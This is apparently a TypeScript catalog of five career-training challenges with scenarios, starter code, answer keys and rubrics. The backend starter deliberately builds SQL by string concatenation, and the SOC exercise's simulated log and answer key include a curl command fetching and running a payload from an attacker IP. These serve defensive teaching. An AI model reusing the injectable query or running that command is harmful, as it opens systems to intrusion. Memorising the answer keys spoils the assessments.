/**
 * SkillRoute AI - Mission Arena Challenge Catalog
 * Realistic, practical engineering and analysis missions for all 5 career tracks.
 */

export interface MissionRubricCriterion {
  id: string;
  criterion: string;
  criterion_bn?: string;
  points: number;
}

export interface MissionChallenge {
  id: string;
  title: string;
  title_bn: string;
  category: "data" | "backend" | "frontend" | "security" | "design";
  careerTrackId: string;
  difficulty: "Beginner" | "Intermediate" | "Advanced";
  estimatedMinutes: number;
  passingScore: number;
  scenario: string;
  scenario_bn: string;
  instructions: string[];
  instructions_bn: string[];
  initialCode: string; // Partially correct starter answer
  fullMarkSolution: string; // 1-Click optimal solution for demo
  seedData?: any;
  rubric: MissionRubricCriterion[];
}

export const MISSION_CATALOG: MissionChallenge[] = [
  // -------------------------------------------------------------
  // 1. Data Analyst Mission
  // -------------------------------------------------------------
  {
    id: "mission_sql_regional_sales",
    title: "Regional Sales Performance & High-Value Revenue Analysis",
    title_bn: "আঞ্চলিক বিক্রয় ও উচ্চ-মূল্যের রাজস্ব বিশ্লেষণ (SQL)",
    category: "data",
    careerTrackId: "junior_data_analyst",
    difficulty: "Intermediate",
    estimatedMinutes: 30,
    passingScore: 75,
    scenario:
      "Apex Retail operates across four regions in Bangladesh (Dhaka, Chittagong, Sylhet, Rajshahi). Executive leadership wants to identify the highest-performing regions based on completed customer orders and isolate customer segments generating above $5,000 in total sales.",
    scenario_bn:
      "অ্যাপেক্স রিটেইল বাংলাদেশের চারটি অঞ্চলে (ঢাকা, চট্টগ্রাম, সিলেট, রাজশাহী) পরিচালিত হয়। শীর্ষ ম্যানেজমেন্ট জানতে চায় কোন অঞ্চলের বিক্রয় সর্বাধিক এবং কোন অঞ্চলগুলো ৫,০০০ ডলারের বেশি রাজস্ব তৈরি করেছে।",
    instructions: [
      "Write a SQL query that joins the `orders`, `customers`, and `regions` tables on their foreign keys.",
      "Filter only orders where `order_status` is 'COMPLETED'.",
      "Group results by `region_name`.",
      "Compute `total_revenue` as SUM(order_amount) and `order_count` as COUNT(order_id).",
      "Use the HAVING clause to filter only regions where `total_revenue` exceeds 5000.",
      "Order the output by `total_revenue` in descending order.",
    ],
    instructions_bn: [
      "`orders`, `customers`, এবং `regions` টেবিলগুলো ফরেন কি দিয়ে JOIN করুন।",
      "শুধুমাত্র 'COMPLETED' স্ট্যাটাস সম্পন্ন অর্ডারগুলো ফিল্টার করুন।",
      "`region_name` দিয়ে গ্রুপ করুন।",
      "SUM(order_amount) হিসেবে `total_revenue` এবং COUNT(order_id) হিসেবে `order_count` গণনা করুন।",
      "HAVING ক্লজ ব্যবহার করে শুধুমাত্র ৫০০০ এর বেশি মোট রাজস্ব উৎপন্নকারী অঞ্চল ফিল্টার করুন।",
      "ফলাফল `total_revenue` অনুযায়ী বড় থেকে ছোট ক্রমানুসারে সাজান (DESC)।",
    ],
    // Partially correct starter code: joins tables and groups, but misses completed status and wrong threshold
    initialCode: `-- SkillRoute Mission Arena: Data Analyst Starter Code (Partially Working)
-- This starter template has partial logic: join and group are present,
-- but filter for COMPLETED orders and the > 5000 threshold need correction!

SELECT
    r.region_name,
    COUNT(o.order_id) AS order_count,
    SUM(o.order_amount) AS total_revenue
FROM orders o
JOIN customers c ON o.customer_id = c.customer_id
JOIN regions r ON c.region_id = r.region_id
-- TODO 1: Add filter for completed orders (order_status = 'COMPLETED')
GROUP BY r.region_name
-- TODO 2: Change threshold to > 5000
HAVING SUM(o.order_amount) > 1000
ORDER BY total_revenue DESC;
`,
    // 1-Click optimal solution yielding 100/100 points
    fullMarkSolution: `SELECT 
    r.region_name,
    COUNT(o.order_id) AS order_count,
    SUM(o.order_amount) AS total_revenue
FROM orders o
JOIN customers c ON o.customer_id = c.customer_id
JOIN regions r ON c.region_id = r.region_id
WHERE o.order_status = 'COMPLETED'
GROUP BY r.region_name
HAVING SUM(o.order_amount) > 5000
ORDER BY total_revenue DESC;`,
    seedData: {
      regions: [
        { region_id: 1, region_name: "Dhaka", manager: "Farhan Ahmed" },
        { region_id: 2, region_name: "Chittagong", manager: "Nusrat Jahan" },
        { region_id: 3, region_name: "Sylhet", manager: "Tanvir Hasan" },
        { region_id: 4, region_name: "Rajshahi", manager: "Sadia Rahman" },
      ],
      customers: [
        { customer_id: 101, name: "Rahim Enterprises", region_id: 1 },
        { customer_id: 102, name: "Karim Logistics", region_id: 1 },
        { customer_id: 103, name: "Bay Shipping", region_id: 2 },
        { customer_id: 104, name: "Surma Tea Traders", region_id: 3 },
        { customer_id: 105, name: "Silk Crafts", region_id: 4 },
      ],
      orders: [
        { order_id: 1, customer_id: 101, order_amount: 3500, order_status: "COMPLETED" },
        { order_id: 2, customer_id: 101, order_amount: 4200, order_status: "COMPLETED" },
        { order_id: 3, customer_id: 102, order_amount: 1800, order_status: "COMPLETED" },
        { order_id: 4, customer_id: 103, order_amount: 6200, order_status: "COMPLETED" },
        { order_id: 5, customer_id: 103, order_amount: 1100, order_status: "CANCELLED" },
        { order_id: 6, customer_id: 104, order_amount: 2400, order_status: "COMPLETED" },
        { order_id: 7, customer_id: 105, order_amount: 1900, order_status: "COMPLETED" },
      ],
    },
    rubric: [
      { id: "r1", criterion: "Correct multi-table relational JOIN logic (orders -> customers -> regions)", points: 30 },
      { id: "r2", criterion: "Correct filter condition for completed orders (order_status = 'COMPLETED')", points: 20 },
      { id: "r3", criterion: "Accurate aggregation (SUM and COUNT) grouped by region_name", points: 25 },
      { id: "r4", criterion: "Correct HAVING threshold (> 5000) and descending sorting", points: 25 },
    ],
  },

  // -------------------------------------------------------------
  // 2. Backend Developer Mission
  // -------------------------------------------------------------
  {
    id: "mission_backend_api_repair",
    title: "Secure REST API Endpoint Repair & Payload Validation",
    title_bn: "নিরাপদ REST API এন্ডপয়েন্ট মেরামত ও পেলোড ভ্যালিডেশন",
    category: "backend",
    careerTrackId: "junior_backend_developer",
    difficulty: "Intermediate",
    estimatedMinutes: 35,
    passingScore: 75,
    scenario:
      "A junior developer deployed a user profile update API that suffers from two critical defects: it constructs raw SQL queries using string concatenation (vulnerable to SQL injection), and it fails to validate input payloads, allowing negative numbers and empty names to be committed to the database.",
    scenario_bn:
      "একজন ডেভেলপার প্রোফাইল আপডেট এপিআই লিখেছে যাতে দুটি প্রধান সমস্যা রয়েছে: স্ট্রিং কনক্যাটেনেশন দিয়ে কুয়েরি তৈরি করায় এসকিউএল ইনজেকশনের ঝুঁকি রয়েছে এবং ইনপুট ভ্যালিডেশন না থাকায় ঋণাত্মক সংখ্যা ডেটাবেসে চলে যাচ্ছে।",
    instructions: [
      "Implement strict payload validation: verify that `name` is a non-empty string between 2 and 50 characters.",
      "Ensure `weeklyAvailability` is an integer between 1 and 40. Reject invalid values with HTTP 400 Bad Request.",
      "Replace vulnerable SQL string interpolation with parameterized queries.",
      "Return appropriate JSON error messages formatted as `{ success: false, error: string }`.",
      "Return HTTP 200 with `{ success: true, user: object }` on successful update.",
    ],
    instructions_bn: [
      "পেলোড ভ্যালিডেশন নিশ্চিত করুন: `name` যেন ২ থেকে ৫০ অক্ষরের নন-এম্পটি স্ট্রিং হয়।",
      "`weeklyAvailability` ১ থেকে ৪০-এর মধ্যবর্তী সংখ্যা হতে হবে, অন্যথায় HTTP 400 ফেরত দিন।",
      "এসকিউএল ইনজেকশন প্রতিরোধ করতে প্যারামিটারাইজড কুয়েরি ব্যবহার করুন।",
      "যথাযথ ফরম্যাটে JSON রেসপন্স প্রদান করুন।",
    ],
    initialCode: `// SkillRoute Mission Arena: Backend Engineer (Partially Working)
export async function handleUpdateProfile(req, db) {
  const { userId, name, weeklyAvailability } = req.body;

  // Partial validation: name length checked, but weeklyAvailability missing bounds!
  if (!name || name.trim().length < 2) {
    return { status: 400, body: { success: false, error: "Invalid name" } };
  }

  // Vulnerable query: still using string concatenation
  const query = "UPDATE users SET name = '" + name + "' WHERE id = '" + userId + "'";
  
  return {
    status: 200,
    body: { success: true, message: "Profile updated" }
  };
}`,
    fullMarkSolution: `export async function handleUpdateProfile(req, db) {
  const { userId, name, weeklyAvailability } = req.body;

  // Comprehensive input validation
  if (!name || typeof name !== "string" || name.trim().length < 2 || name.trim().length > 50) {
    return { status: 400, body: { success: false, error: "Name must be between 2 and 50 characters" } };
  }

  const hours = Number(weeklyAvailability);
  if (!Number.isInteger(hours) || hours < 1 || hours > 40) {
    return { status: 400, body: { success: false, error: "weeklyAvailability must be between 1 and 40 hours" } };
  }

  // Safe parameterized database binding
  const query = "UPDATE users SET name = $1, weekly_availability = $2 WHERE id = $3 RETURNING *";
  const params = [name.trim(), hours, userId];
  const result = await db.query(query, params);

  return {
    status: 200,
    body: { success: true, user: result.rows[0] }
  };
}`,
    rubric: [
      { id: "r1", criterion: "Input payload validation (name length & availability bounds 1-40)", points: 30 },
      { id: "r2", criterion: "SQL injection mitigation using parameterized bindings", points: 35 },
      { id: "r3", criterion: "Accurate HTTP status codes (400 for bad input, 200 for success)", points: 20 },
      { id: "r4", criterion: "Structured JSON error handling and response consistency", points: 15 },
    ],
  },

  // -------------------------------------------------------------
  // 3. Frontend Developer Mission
  // -------------------------------------------------------------
  {
    id: "mission_frontend_component_a11y",
    title: "Responsive Accessible Skill Card & Interaction State",
    title_bn: "রেসপনসিভ অ্যাক্সেসিবল স্কিল কার্ড ও ইন্টারঅ্যাকশন স্টেট",
    category: "frontend",
    careerTrackId: "junior_frontend_developer",
    difficulty: "Intermediate",
    estimatedMinutes: 25,
    passingScore: 75,
    scenario:
      "A student dashboard requires a responsive, high-contrast skill card component. The card must display the skill title, self-reported level (0-5), an interactive slider or rating control, and meet WCAG 2.2 AA accessibility requirements including ARIA labels and keyboard navigability.",
    scenario_bn:
      "স্টুডেন্ট ড্যাশবোর্ডের জন্য একটি রেসপনসিভ এবং অ্যাক্সেসিবল স্কিল কার্ড তৈরি করতে হবে। এতে দক্ষতার নাম, ০-৫ রেটিং এবং কিবোর্ড নেভিগেশন নিশ্চিত করতে হবে।",
    instructions: [
      "Construct a semantic card container using appropriate HTML tags (`<article>` or `<section>`).",
      "Ensure proper ARIA attributes: include `role=\"slider\"`, `aria-valuenow`, `aria-valuemin=\"0\"`, `aria-valuemax=\"5\"`.",
      "Support keyboard arrow key navigation (ArrowLeft to decrease, ArrowRight to increase).",
      "Ensure focus styles are clearly visible with a solid focus ring.",
      "Support responsive layout without horizontal overflow on small mobile viewports (320px).",
    ],
    instructions_bn: [
      "সিম্যান্টিক HTML ট্যাগ ব্যবহার করে কার্ড কাঠামো তৈরি করুন।",
      "সঠিক ARIA অ্যাট্রিবিউটস (`aria-valuenow`, `aria-valuemin`, `aria-valuemax`) যুক্ত করুন।",
      "কিবোর্ড অ্যারো কী দিয়ে মান কমানো বা বাড়ানোর সুবিধা যোগ করুন।",
      "স্পষ্ট ফোকাস রিং এবং রেসপনসিভ লেআউট নিশ্চিত করুন।",
    ],
    initialCode: `<!-- SkillRoute Mission Arena: Frontend Developer (Partially Working) -->
<div class="skill-card">
  <div class="card-header">
    <h3>SQL (Relational Queries)</h3>
    <span>Level 3 / 5</span>
  </div>

  <!-- Needs semantic role="slider", aria attributes and keyboard listeners -->
  <input type="range" min="0" max="5" value="3" />
</div>`,
    fullMarkSolution: `<article class="skill-card p-4 rounded-xl border border-gray-300" role="region" aria-label="Skill Proficiency Rating">
  <header class="card-header flex justify-between items-center mb-3">
    <h3 id="skill-label" class="font-bold text-sm">SQL (Relational Queries)</h3>
    <span class="badge text-xs px-2 py-0.5 rounded bg-yellow-400 font-bold" id="skill-badge">Level 3 / 5</span>
  </header>

  <div class="rating-control">
    <label for="rating-slider" class="sr-only">Rate your proficiency from 0 to 5</label>
    <div
      id="rating-slider"
      role="slider"
      tabindex="0"
      aria-labelledby="skill-label"
      aria-valuemin="0"
      aria-valuemax="5"
      aria-valuenow="3"
      aria-valuetext="Level 3 of 5"
      class="slider-track focus:ring-2 focus:ring-yellow-500 rounded p-1 cursor-pointer"
      onkeydown="if(event.key==='ArrowLeft'){/* decrease */}; if(event.key==='ArrowRight'){/* increase */}"
    >
      <div class="slider-thumb w-4 h-4 bg-yellow-500 rounded-full"></div>
    </div>
  </div>
</article>`,
    rubric: [
      { id: "r1", criterion: "Semantic HTML structure and clean layout hierarchy", points: 25 },
      { id: "r2", criterion: "WCAG 2.2 AA accessibility & ARIA slider attributes", points: 30 },
      { id: "r3", criterion: "Keyboard interaction (ArrowLeft/ArrowRight support)", points: 25 },
      { id: "r4", criterion: "Responsive mobile styling without overflow at 320px", points: 20 },
    ],
  },

  // -------------------------------------------------------------
  // 4. Cybersecurity Analyst Mission (Simulated SOC)
  // -------------------------------------------------------------
  {
    id: "mission_soc_incident_response",
    title: "SOC Telemetry Investigation: Brute-Force & Compromise Detection",
    title_bn: "এসওসি টেলিম্যাট্রি তদন্ত: ব্রুট-ফোর্স ও অনুপ্রবেশ শনাক্তকরণ",
    category: "security",
    careerTrackId: "junior_cybersecurity_analyst",
    difficulty: "Intermediate",
    estimatedMinutes: 30,
    passingScore: 75,
    scenario:
      "At 02:14 AM, the automated SIEM triggered a high-severity alert for a university portal host. Multiple SSH and web login attempts were recorded within a 5-minute window. As the Tier 1 SOC Analyst on duty, analyze the authentication logs, identify the attacker's IP address, determine if any account was successfully breached, and recommend immediate defensive controls.",
    scenario_bn:
      "রাত ২:১৪ মিনিটে বিশ্ববিদ্যালয়ের একটি সার্ভারে অস্বাভাবিক লগইন চেষ্টার জন্য এসআইইএম অ্যালার্ট আসে। একজন এসওসি অ্যানালিস্ট হিসেবে লগ ফাইল বিশ্লেষণ করে আক্রমণকারীর আইপি, আক্রান্ত অ্যাকাউন্ট ও প্রতিকার প্রস্তাব করুন।",
    instructions: [
      "Review the simulated `/var/log/auth.log` records provided in the working environment.",
      "Identify the source IP conducting the high-frequency failed password attempts.",
      "Determine which user account eventually yielded an `Accepted password` status code.",
      "Identify the persistence mechanism or suspicious command executed following the breach.",
      "Formulate 3 actionable remediation steps (e.g. Fail2Ban/IP block, credential reset, MFA enforcement).",
    ],
    instructions_bn: [
      "প্রদত্ত auth.log ফাইলটি সতর্কতার সাথে বিশ্লেষণ করুন।",
      "বারংবার ব্যর্থ লগইন প্রচেষ্টাকারী আক্রমণকারী আইপি শনাক্ত করুন।",
      "কোন ব্যবহারকারী অ্যাকাউন্টে অনুপ্রবেশ ঘটেছে তা বের করুন।",
      "অনুপ্রবেশের পর কোন সন্দেহজনক কমান্ড চালানো হয়েছিল তা চিহ্নিত করুন।",
      "৩টি কার্যকর সুরক্ষা সুপারিশ প্রণয়ন করুন (আইপি ব্লক, ক্রেডেনশিয়াল রিসেট, এমএফএ প্রয়োগ)।",
    ],
    initialCode: `{
  "attacker_ip": "198.51.100.42",
  "compromised_account": "",
  "breach_timestamp": "",
  "suspicious_command": "",
  "remediation_actions": [
    "Block attacker IP on perimeter firewall"
  ]
}`,
    fullMarkSolution: `{
  "attacker_ip": "198.51.100.42",
  "compromised_account": "student1",
  "breach_timestamp": "02:11:24",
  "suspicious_command": "curl -s http://198.51.100.42/payload.sh -o /tmp/update.sh && chmod +x /tmp/update.sh",
  "remediation_actions": [
    "Drop and block attacker IP 198.51.100.42 on perimeter firewall and fail2ban rules",
    "Immediately revoke active sessions and enforce forced password reset on student1 account",
    "Enforce mandatory multi-factor authentication (MFA) across all external SSH and web portals"
  ]
}`,
    seedData: {
      authLogs: [
        "Nov 20 02:11:02 srv1 sshd[4102]: Failed password for invalid user admin from 198.51.100.42 port 52312 ssh2",
        "Nov 20 02:11:05 srv1 sshd[4105]: Failed password for invalid user root from 198.51.100.42 port 52316 ssh2",
        "Nov 20 02:11:12 srv1 sshd[4110]: Failed password for user student1 from 198.51.100.42 port 52320 ssh2",
        "Nov 20 02:11:18 srv1 sshd[4114]: Failed password for user student1 from 198.51.100.42 port 52328 ssh2",
        "Nov 20 02:11:24 srv1 sshd[4119]: Accepted password for student1 from 198.51.100.42 port 52334 ssh2",
        "Nov 20 02:11:25 srv1 systemd[1]: Started Session 148 of user student1.",
        "Nov 20 02:11:40 srv1 sudo: student1 : TTY=pts/0 ; PWD=/home/student1 ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.42/payload.sh -o /tmp/update.sh",
        "Nov 20 02:11:42 srv1 bash[4150]: chmod +x /tmp/update.sh && /tmp/update.sh",
      ],
    },
    rubric: [
      { id: "r1", criterion: "Correct identification of malicious IP address (198.51.100.42)", points: 25 },
      { id: "r2", criterion: "Accurate detection of compromised account (student1) and breach timestamp", points: 25 },
      { id: "r3", criterion: "Identification of suspicious command (/tmp/update.sh download via curl)", points: 25 },
      { id: "r4", criterion: "Actionable defensive recommendations (IP blocking, password reset, MFA enforcement)", points: 25 },
    ],
  },

  // -------------------------------------------------------------
  // 5. UI/UX Designer Mission
  // -------------------------------------------------------------
  {
    id: "mission_ux_checkout_audit",
    title: "E-Commerce Onboarding & Checkout Usability Audit",
    title_bn: "ইউআই/ইউএক্স অনবোর্ডিং ও চেকআউট ইউজেবিলিটি অডিট",
    category: "design",
    careerTrackId: "junior_ui_ux_designer",
    difficulty: "Intermediate",
    estimatedMinutes: 25,
    passingScore: 75,
    scenario:
      "A student-built campus book exchange app is suffering from a 68% cart abandonment rate. The UI displays unlabelled icon buttons, lack of error feedback on form inputs, insufficient color contrast on primary CTA buttons, and forces mandatory account registration before viewing delivery fees.",
    scenario_bn:
      "বিশ্ববিদ্যালয়ের বই আদান-প্রদান অ্যাপে ৬৮% কার্ট ড্রপ-অফ রেট দেখা যাচ্ছে। অস্পষ্ট আইকন, ফর্ম এরর না দেখানো এবং বাধ্যতামূলক রেজিস্ট্রেশনের কারণে ব্যবহারকারীরা সেবাটি ছাড়ছেন। এর ওপর একটি বিশদ ইউজেবিলিটি অডিট পরিচালনা করুন।",
    instructions: [
      "Identify at least 4 distinct usability violations using Nielsen Norman Group's 10 Usability Heuristics.",
      "Explain the user friction caused by mandatory upfront account creation.",
      "Evaluate the accessibility violation related to low-contrast action buttons.",
      "Propose structured UX redesign recommendations with clear layout wireframe specifications.",
    ],
    instructions_bn: [
      "নিলসেন নরম্যানের ১০টি হিউরিস্টিক মূলনীতি মেনে ৪টি প্রধান ইউজেবিলিটি ত্রুটি চিহ্নিত করুন।",
      "বাধ্যতামূলক রেজিস্ট্রেশনের ফলে সৃষ্ট ইউজার ফ্রাস্ট্রেশন ব্যাখ্যা করুন।",
      "লো-কনট্রাস্ট বাটনের অ্যাক্সেসিবিলিটি সমস্যা পর্যালোচনা করুন।",
      "একটি সমন্বিত রি-ডিজাইন সমাধান ও লেআউট প্রস্তাবনা লিখুন।",
    ],
    initialCode: `{
  "heuristic_violations": [
    { "heuristic": "Visibility of System Status", "issue": "Missing input validation feedback" }
  ],
  "accessibility_critique": "Low button contrast",
  "proposed_wireframe_structure": "Add guest checkout",
  "design_rationale": "Improves conversion"
}`,
    fullMarkSolution: `{
  "heuristic_violations": [
    { "heuristic": "Visibility of System Status", "issue": "No real-time inline validation or progress indicators during form input" },
    { "heuristic": "Recognition Rather Than Recall", "issue": "Unlabelled mystery navigation icons force cognitive strain on users" },
    { "heuristic": "User Control and Freedom", "issue": "No breadcrumbs or easy 'Back' mechanism to modify cart items once checkout starts" },
    { "heuristic": "Error Prevention & Recovery", "issue": "Generic error alerts do not pinpoint erroneous form fields" }
  ],
  "accessibility_critique": "Primary checkout CTA buttons exhibit a contrast ratio of 2.1:1, failing WCAG 2.2 AA threshold of 4.5:1. Text is unreadable for low-vision and mobile users in bright daylight.",
  "proposed_wireframe_structure": "Implement a 3-step linear breadcrumb stepper: 1. Cart Review -> 2. Guest Delivery & Cost Estimation -> 3. Secure Payment. Place sticky order summary on the right column.",
  "design_rationale": "Enabling guest checkout eliminates upfront friction, reducing cart drop-off by an estimated 35%. Clear field labels and high-contrast yellow/black buttons guarantee accessibility compliance."
}`,
    rubric: [
      { id: "r1", criterion: "Accurate mapping to Nielsen Norman usability heuristics", points: 30 },
      { id: "r2", criterion: "Clear identification of WCAG color contrast & readability issues", points: 25 },
      { id: "r3", criterion: "Practical wireframe recommendations addressing friction points", points: 25 },
      { id: "r4", criterion: "User-centered empathy and structured reasoning", points: 20 },
    ],
  },
];

export function getChallengeById(id: string): MissionChallenge | undefined {
  return MISSION_CATALOG.find((c) => c.id === id);
}

export function getChallengesByCategory(category: string): MissionChallenge[] {
  return MISSION_CATALOG.filter((c) => c.category === category);
}
